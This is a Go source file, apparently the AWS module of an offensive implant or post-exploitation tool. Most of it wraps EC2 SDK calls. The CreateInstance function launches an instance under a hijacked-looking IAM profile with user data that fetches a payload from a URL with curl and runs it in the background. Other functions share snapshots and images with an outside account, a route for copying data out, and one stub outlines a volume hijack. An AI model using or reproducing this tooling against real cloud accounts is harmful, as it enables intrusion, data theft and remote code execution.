package implantaws

import (
	"encoding/base64"
	"fmt"

	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/aws/awserr"
	"github.com/aws/aws-sdk-go/aws/session"
	"github.com/aws/aws-sdk-go/service/ec2"
	"github.com/drk1wi/Modlishka/log"
)

func HijackVolume() {
	//stop instance
	//detach volume
	//attach volume
	//start instance
}

func CreateVolumeFromSnapshot(sess *session.Session, snapid string, zone string) string {
	svc := ec2.New(sess)
	input := &ec2.CreateVolumeInput{
		AvailabilityZone: aws.String(zone),
		SnapshotId:       aws.String(snapid),
		VolumeType:       aws.String("gp2"),
	}

	result, err := svc.CreateVolume(input)
	if err != nil {
		if aerr, ok := err.(awserr.Error); ok {
			switch aerr.Code() {
			default:
				return aerr.Error()
			}
		} else {
			// Print the error, cast err to awserr.Error to get the Code and
			// Message from an error.
			return err.Error()
		}
	}

	return *result.VolumeId
}

func DescribeInstances(sess *session.Session) []*ec2.Reservation {

	svc := ec2.New(sess)
	input := &ec2.DescribeInstancesInput{}

	result, err := svc.DescribeInstances(input)
	if err != nil {
		if aerr, ok := err.(awserr.Error); ok {
			switch aerr.Code() {
			default:
				fmt.Println(aerr.Error())
			}
		} else {
			// Print the error, cast err to awserr.Error to get the Code and
			// Message from an error.
			fmt.Println(err.Error())
		}
		return nil
	}
	return result.Reservations
}

func DescribeInstanceAttribute(sess *session.Session, InstanceId string, attribute string) *ec2.DescribeInstanceAttributeOutput {
	svc := ec2.New(sess)
	input := &ec2.DescribeInstanceAttributeInput{
		Attribute:  aws.String(attribute),
		InstanceId: aws.String(InstanceId),
	}

	result, err := svc.DescribeInstanceAttribute(input)
	if err != nil {
		if aerr, ok := err.(awserr.Error); ok {
			switch aerr.Code() {
			default:
				fmt.Println(aerr.Error())
			}
		} else {
			// Print the error, cast err to awserr.Error to get the Code and
			// Message from an error.
			fmt.Println(err.Error())
		}
		return nil
	}

	return result

}

func RunInstance(sess *session.Session, data *ec2.RunInstancesInput) string {

	// Create EC2 service client
	svc := ec2.New(sess)

	// Specify the details of the instance that you want to create.
	runResult, err := svc.RunInstances(data)

	if err != nil {
		log.Errorf("Could not create instance %v", err)
		return ""
	}

	log.Infof("Created instance %v", *runResult.Instances[0].InstanceId)
	return *runResult.Instances[0].InstanceId
}

func ec2Status(sess *session.Session, instanceID string) []*ec2.InstanceStatus {
	svc := ec2.New(sess)
	input := &ec2.DescribeInstanceStatusInput{
		InstanceIds: []*string{
			aws.String(instanceID),
		},
	}

	result, err := svc.DescribeInstanceStatus(input)
	if err != nil {
		if aerr, ok := err.(awserr.Error); ok {
			switch aerr.Code() {
			default:
				fmt.Println(aerr.Error())
			}
		} else {
			// Print the error, cast err to awserr.Error to get the Code and
			// Message from an error.
			fmt.Println(err.Error())
		}
		return nil
	}

	fmt.Println("Checking if EC2 is Running...")
	return result.InstanceStatuses
}

func ModifyInstanceAttribute(sess *session.Session, input *ec2.ModifyInstanceAttributeInput) bool {

	svc := ec2.New(sess)

	_, err := svc.ModifyInstanceAttribute(input)
	if err != nil {
		if aerr, ok := err.(awserr.Error); ok {
			switch aerr.Code() {
			default:
				fmt.Println(aerr.Error())
			}
		} else {
			// Print the error, cast err to awserr.Error to get the Code and
			// Message from an error.
			fmt.Println(err.Error())
		}
		return false
	}
	return true

}

func StopInstance(sess *session.Session, instanceID string) {
	svc := ec2.New(sess)
	input := &ec2.StopInstancesInput{
		InstanceIds: []*string{
			aws.String(instanceID),
		},
	}

	result, err := svc.StopInstances(input)
	if err != nil {
		if aerr, ok := err.(awserr.Error); ok {
			switch aerr.Code() {
			default:
				fmt.Println(aerr.Error())
			}
		} else {
			// Print the error, cast err to awserr.Error to get the Code and
			// Message from an error.
			fmt.Println(err.Error())
		}
		return
	}

	log.Infof("Stopping Instance %v - State: %v", instanceID, *result.StoppingInstances[0].CurrentState.Name)
}

func StartInstance(sess *session.Session, instanceID string) {
	svc := ec2.New(sess)
	input := &ec2.StartInstancesInput{
		InstanceIds: []*string{
			aws.String(instanceID),
		},
	}

	result, err := svc.StartInstances(input)
	if err != nil {
		if aerr, ok := err.(awserr.Error); ok {
			switch aerr.Code() {
			default:
				fmt.Println(aerr.Error())
			}
		} else {
			// Print the error, cast err to awserr.Error to get the Code and
			// Message from an error.
			fmt.Println(err.Error())
		}
		return
	}

	log.Infof("Starting Instance %v - State: %v", instanceID, *result.StartingInstances[0].CurrentState.Name)
}

func DescribeSecurityGroup(sess *session.Session, sg string) *ec2.DescribeSecurityGroupsOutput {
	svc := ec2.New(sess)
	input := &ec2.DescribeSecurityGroupsInput{
		GroupIds: []*string{
			aws.String(sg),
		},
	}

	result, err := svc.DescribeSecurityGroups(input)
	if err != nil {
		if aerr, ok := err.(awserr.Error); ok {
			switch aerr.Code() {
			default:
				fmt.Println(aerr.Error())
			}
		} else {
			// Print the error, cast err to awserr.Error to get the Code and
			// Message from an error.
			fmt.Println(err.Error())
		}
		return nil
	}

	return result
}

func DescribeVpnConnections(sess *session.Session) *ec2.DescribeVpnConnectionsOutput {
	svc := ec2.New(sess)
	input := &ec2.DescribeVpnConnectionsInput{}

	result, err := svc.DescribeVpnConnections(input)
	if err != nil {
		if aerr, ok := err.(awserr.Error); ok {
			switch aerr.Code() {
			default:
				fmt.Println(aerr.Error())
			}
		} else {
			// Print the error, cast err to awserr.Error to get the Code and
			// Message from an error.
			fmt.Println(err.Error())
		}
		return nil
	}
	return result
}

func DescribeVpcPeeringConnections(sess *session.Session) *ec2.DescribeVpcPeeringConnectionsOutput {
	svc := ec2.New(sess)
	input := &ec2.DescribeVpcPeeringConnectionsInput{}

	result, err := svc.DescribeVpcPeeringConnections(input)
	if err != nil {
		if aerr, ok := err.(awserr.Error); ok {
			switch aerr.Code() {
			default:
				fmt.Println(aerr.Error())
			}
		} else {
			// Print the error, cast err to awserr.Error to get the Code and
			// Message from an error.
			fmt.Println(err.Error())
		}
		return nil
	}
	return result
}

func CreateSnapshot(sess *session.Session, volumeid string) *ec2.Snapshot {
	svc := ec2.New(sess)
	input := &ec2.CreateSnapshotInput{
		Description: aws.String("This is my root volume snapshot."),
		VolumeId:    aws.String(volumeid),
	}

	result, err := svc.CreateSnapshot(input)
	if err != nil {
		if aerr, ok := err.(awserr.Error); ok {
			switch aerr.Code() {
			default:
				fmt.Println(aerr.Error())
			}
		} else {
			// Print the error, cast err to awserr.Error to get the Code and
			// Message from an error.
			fmt.Println(err.Error())
		}
		return nil
	}

	return result
}

func DescribeImages(sess *session.Session, instanceid string) *ec2.DescribeImagesOutput {
	svc := ec2.New(sess)
	input := &ec2.DescribeImagesInput{
		Filters: []*ec2.Filter{
			{
				Name: aws.String("attachment.instance-id"),
				Values: []*string{
					aws.String(instanceid),
				},
			},
			{
				Name: aws.String("attachment.delete-on-termination"),
				Values: []*string{
					aws.String("true"),
				},
			},
		},
	}

	result, err := svc.DescribeImages(input)
	if err != nil {
		if aerr, ok := err.(awserr.Error); ok {
			switch aerr.Code() {
			default:
				fmt.Println(aerr.Error())
			}
		} else {
			// Print the error, cast err to awserr.Error to get the Code and
			// Message from an error.
			fmt.Println(err.Error())
		}
		return nil
	}

	return result
}

func DescribeVolumes(sess *session.Session, instanceid string) *ec2.DescribeVolumesOutput {
	svc := ec2.New(sess)
	input := &ec2.DescribeVolumesInput{
		Filters: []*ec2.Filter{
			{
				Name: aws.String("attachment.instance-id"),
				Values: []*string{
					aws.String(instanceid),
				},
			},
			{
				Name: aws.String("attachment.delete-on-termination"),
				Values: []*string{
					aws.String("true"),
				},
			},
		},
	}

	result, err := svc.DescribeVolumes(input)
	if err != nil {
		if aerr, ok := err.(awserr.Error); ok {
			switch aerr.Code() {
			default:
				fmt.Println(aerr.Error())
			}
		} else {
			// Print the error, cast err to awserr.Error to get the Code and
			// Message from an error.
			fmt.Println(err.Error())
		}
		return nil
	}

	return result
}

func ModifySnapshotAttribute(sess *session.Session, snapshotid string, accountid string) *ec2.ModifySnapshotAttributeOutput {
	svc := ec2.New(sess)
	input := &ec2.ModifySnapshotAttributeInput{
		SnapshotId:    aws.String(snapshotid),
		Attribute:     aws.String("createVolumePermission"),
		OperationType: aws.String("add"),
		UserIds: []*string{
			aws.String(accountid),
		},
	}

	result, err := svc.ModifySnapshotAttribute(input)
	if err != nil {
		if aerr, ok := err.(awserr.Error); ok {
			switch aerr.Code() {
			default:
				fmt.Println(aerr.Error())
			}
		} else {
			// Print the error, cast err to awserr.Error to get the Code and
			// Message from an error.
			fmt.Println(err.Error())
		}
		return nil
	}

	return result
}

func ModifyImageAttribute(sess *session.Session, imageid string, accountid string) *ec2.ModifyImageAttributeOutput {
	svc := ec2.New(sess)
	input := &ec2.ModifyImageAttributeInput{
		ImageId:       aws.String(imageid),
		Attribute:     aws.String("createVolumePermission"),
		OperationType: aws.String("add"),
		UserIds: []*string{
			aws.String(accountid),
		},
	}

	result, err := svc.ModifyImageAttribute(input)
	if err != nil {
		if aerr, ok := err.(awserr.Error); ok {
			switch aerr.Code() {
			default:
				fmt.Println(aerr.Error())
			}
		} else {
			// Print the error, cast err to awserr.Error to get the Code and
			// Message from an error.
			fmt.Println(err.Error())
		}
		return nil
	}

	return result
}

func DetachVolume(sess *session.Session, instanceid string, volumeid string) string {
	svc := ec2.New(sess)
	input := &ec2.DetachVolumeInput{
		InstanceId: aws.String(instanceid),
		VolumeId:   aws.String(volumeid),
	}

	result, err := svc.DetachVolume(input)
	if err != nil {
		if aerr, ok := err.(awserr.Error); ok {
			switch aerr.Code() {
			default:
				return aerr.Error()
			}
		} else {
			// Print the error, cast err to awserr.Error to get the Code and
			// Message from an error.
			return aerr.Error()
		}
	}

	return *result.InstanceId + ":" + *result.VolumeId + ":" + *result.State
}

func AttachVolume(sess *session.Session, instanceid string, volumeid string) string {
	svc := ec2.New(sess)
	input := &ec2.AttachVolumeInput{
		InstanceId: aws.String(instanceid),
		VolumeId:   aws.String(volumeid),
		Device:     aws.String("/dev/sda1"),
	}

	result, err := svc.AttachVolume(input)
	if err != nil {
		if aerr, ok := err.(awserr.Error); ok {
			switch aerr.Code() {
			default:
				return aerr.Error()
			}
		} else {
			// Print the error, cast err to awserr.Error to get the Code and
			// Message from an error.
			return aerr.Error()
		}
	}

	return *result.InstanceId + ":" + *result.VolumeId + ":" + *result.State
}

func CreateInstance(sess *session.Session, ami string, payload string) string {

	profile := &ec2.IamInstanceProfileSpecification{
		Name: aws.String("jenkins_ami_baker"),
	}

	userData := fmt.Sprintf(`#!/bin/bash
	curl %s -o /tmp/run
	cd /tmp
	sudo su ubuntu
	sudo chmod +x run
	sudo ./run &`, payload)

	dataEnc := base64.StdEncoding.EncodeToString([]byte(userData))

	ec2data := &ec2.RunInstancesInput{
		// An Amazon Linux AMI ID for t2.micro instances in the us-west-2 region
		ImageId:            aws.String(ami),
		InstanceType:       aws.String("t2.micro"),
		MinCount:           aws.Int64(1),
		MaxCount:           aws.Int64(1),
		UserData:           aws.String(dataEnc),
		IamInstanceProfile: profile,
	}

	//Create instance with userdata payload
	log.Infof("RunInstance")
	data := RunInstance(sess, ec2data)
	return data
}
